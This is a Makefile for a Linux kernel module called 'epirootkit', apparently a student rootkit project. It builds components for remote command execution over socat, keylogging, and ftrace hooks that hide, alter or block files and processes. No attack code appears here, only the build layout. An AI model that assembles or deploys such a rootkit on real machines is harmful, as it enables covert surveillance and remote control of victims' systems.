KERNELDIR := /lib/modules/$(shell uname -r)/build
PWD       := $(shell pwd)

ccflags-y := 								    \
        -I$(src) 							    \
		-I$(src)/crypto						    \
		-I$(src)/network					    \
        -I$(src)/interceptor/core/include 	    \
        -I$(src)/interceptor/hooks/alterate     \
        -I$(src)/interceptor/hooks/forbid 	    \
        -I$(src)/interceptor/hooks/hide

obj-m     := epirootkit.o

epirootkit-objs :=                              \
    main.o                                      \
    exec_cmd.o                                  \
    socat.o                                     \
    file_ops.o                                  \
    epikeylog.o                                 \
    hider.o                                     \
    rootkit_command.o                           \
	crypto/hash.o                               \
	crypto/aes.o                                \
	network/worker.o                            \
	network/socket.o                            \
	network/iostream.o                          \
    interceptor/core/array.o                    \
    interceptor/core/menu.o                     \
    interceptor/core/ftrace.o                   \
    interceptor/hooks/alterate/alterate.o       \
    interceptor/hooks/alterate/list.o           \
    interceptor/hooks/forbid/forbid.o           \
    interceptor/hooks/forbid/list.o             \
    interceptor/hooks/hide/hide.o               \
    interceptor/hooks/hide/list.o               \
    interceptor/misc/fs.o

all: modules

modules:
	@./scripts/generate_socat_h.sh
	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) clean

.PHONY: all modules clean
